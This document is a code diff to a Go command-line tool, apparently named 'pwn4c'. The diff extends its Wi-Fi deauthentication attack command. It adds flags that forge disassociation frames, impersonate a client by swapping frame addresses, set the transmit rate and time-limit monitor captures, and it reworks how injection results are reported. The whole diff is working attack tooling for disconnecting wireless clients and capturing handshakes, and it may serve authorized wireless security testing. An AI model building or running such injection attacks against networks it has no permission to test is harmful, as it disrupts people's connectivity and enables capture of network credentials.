@@ -22,6 +22,10 @@ var (
 	deauthAllClients  bool
 	deauthFilterBSSID string
 	deauthMgmtOnly    bool
+	deauthSeconds     int
+	deauthRate        float64
+	deauthReverse     bool
+	deauthDisassoc    bool
 )
 
 var deauthCmd = &cobra.Command{
@@ -84,6 +88,15 @@ you deliberately want a broadcast burst.`,
 			os.Exit(1)
 		}
 
+		if deauthSeconds < 0 {
+			fmt.Println("[!] --seconds must be zero or positive.")
+			os.Exit(1)
+		}
+		if !deauthMonitor && deauthSeconds > 0 {
+			fmt.Println("[!] --seconds only applies to --monitor captures.")
+			os.Exit(1)
+		}
+
 		if deauthFilterBSSID != "" {
 			hw, err := net.ParseMAC(deauthFilterBSSID)
 			if err != nil || len(hw) != 6 {
@@ -98,10 +111,22 @@ you deliberately want a broadcast burst.`,
 			fmt.Println("    --filter-bssid instead when the goal is a handshake.")
 		}
 
-		// 1. Build the Deauth packet
-		frameHex, err := drone.BuildDeauthFrame(deauthBSSID, deauthClient, drone.ReasonClass3FromNonAssocSTA)
+		// 1. Build the deauth/disassoc frame with a full radiotap header.
+		opts := drone.DefaultFrameOptions()
+		opts.Channel = deauthChannel
+		if deauthRate > 0 {
+			opts.RateMbps = deauthRate
+		}
+		opts.Reverse = deauthReverse
+		opts.Disassoc = deauthDisassoc
+		frameHex, err := drone.BuildManagementFrame(deauthBSSID, deauthClient,
+			drone.ReasonClass3FromNonAssocSTA, opts)
 		if err != nil {
-			fmt.Printf("[!] Failed to build 802.11 deauth frame: %v\n", err)
+			fmt.Printf("[!] Failed to build 802.11 management frame: %v\n", err)
+			os.Exit(1)
+		}
+		if deauthReverse && isBroadcastMAC(deauthClient) {
+			fmt.Println("[!] --reverse needs a unicast client MAC.")
 			os.Exit(1)
 		}
 
@@ -154,7 +179,8 @@ you deliberately want a broadcast burst.`,
 func runPlainDeauth(client *drone.ControlClient, frameHex string, weStartedMonitor bool) {
 	destLabel := clientLabel(deauthClient)
 
-	fmt.Printf("[+] Injecting %d deauth frames (Interval: %dms)...\n", deauthCount, deauthInterval)
+	fmt.Printf("[+] Injecting %d %s frames (Interval: %dms)...\n",
+		deauthCount, frameKind(), deauthInterval)
 	fmt.Printf("    AP (BSSID) : %s\n", deauthBSSID)
 	fmt.Printf("    Client     : %s\n", destLabel)
 	fmt.Printf("    Channel    : %d\n", deauthChannel)
@@ -163,31 +189,42 @@ func runPlainDeauth(client *drone.ControlClient, frameHex string, weStartedMonit
 	}
 
 	txBefore, txBeforeOK := readInjectFrames(client)
-	sent, queued, failed, err := client.SendInjection(frameHex, deauthCount, deauthInterval)
+	res, err := client.InjectFrame(frameHex, deauthCount, deauthInterval, 0)
 	if err != nil {
 		fmt.Printf("[!] Injection failed: %v\n", err)
 		os.Exit(1)
 	}
 
-	fmt.Printf("[+] Injection queued: %d frame(s) (accepted synchronously: %d, failed: %d)\n",
-		queued, sent, failed)
+	fmt.Printf("[+] Injection queued: %d frame(s) (accepted synchronously: %d, dropped: %d, pending: %d)\n",
+		res.Queued, res.Sent, res.Failed, res.Pending)
+	if res.Failed > 0 {
+		fmt.Printf("[!] %d frame(s) were dropped by the drone TX ring (max %d).\n",
+			res.Failed, res.QueueMax)
+	}
 
-	if queued > 0 {
+	if res.Pending > 0 {
 		fmt.Println("[*] Waiting for the drone TX queue to drain...")
-		if err := waitForTxDrain(client, 5*time.Second); err != nil {
+		if err := waitForTxDrain(client, 10*time.Second); err != nil {
 			fmt.Printf("[!] Lost contact with the drone during TX: %v\n", err)
 			fmt.Println("    The drone may have reset — run `pwn4c discover` and check its uptime.")
 			return
 		}
 	}
 
-	reportTxDelta(client, txBefore, txBeforeOK, sent+queued)
+	reportTxDelta(client, txBefore, txBeforeOK, res.Sent+res.Pending)
 
 	if weStartedMonitor {
 		if err := client.StopMonitor(); err != nil {
 			fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
 		}
 	}
+}
+
+func frameKind() string {
+	if deauthDisassoc {
+		return "disassociation"
+	}
+	return "deauth"
 }
 
 // isBroadcastMAC reports whether the address is the group-addressed broadcast
@@ -283,6 +320,10 @@ func init() {
 	deauthCmd.Flags().BoolVar(&deauthAllClients, "all-clients", false, "Allow a broadcast deauth with --monitor (clients usually ignore it)")
 	deauthCmd.Flags().StringVar(&deauthFilterBSSID, "filter-bssid", "", "Kernel BPF filter: capture only frames for this BSSID (with --monitor)")
 	deauthCmd.Flags().BoolVar(&deauthMgmtOnly, "mgmt-only", false, "Kernel BPF filter: management frames only (with --monitor)")
+	deauthCmd.Flags().IntVar(&deauthSeconds, "seconds", 0, "With --monitor: stop listening after N seconds (0 = until Ctrl+C)")
+	deauthCmd.Flags().Float64Var(&deauthRate, "rate", 1, "PHY TX rate in Mbps (1, 2, 5.5, 6, 11, 12, 24, 54)")
+	deauthCmd.Flags().BoolVar(&deauthReverse, "reverse", false, "Impersonate the client (Addr1=AP, Addr2=client)")
+	deauthCmd.Flags().BoolVar(&deauthDisassoc, "disassoc", false, "Send Disassociation frames instead of Deauthentication")
 	_ = deauthCmd.MarkFlagRequired("bssid")
 
 	rootCmd.AddCommand(deauthCmd)
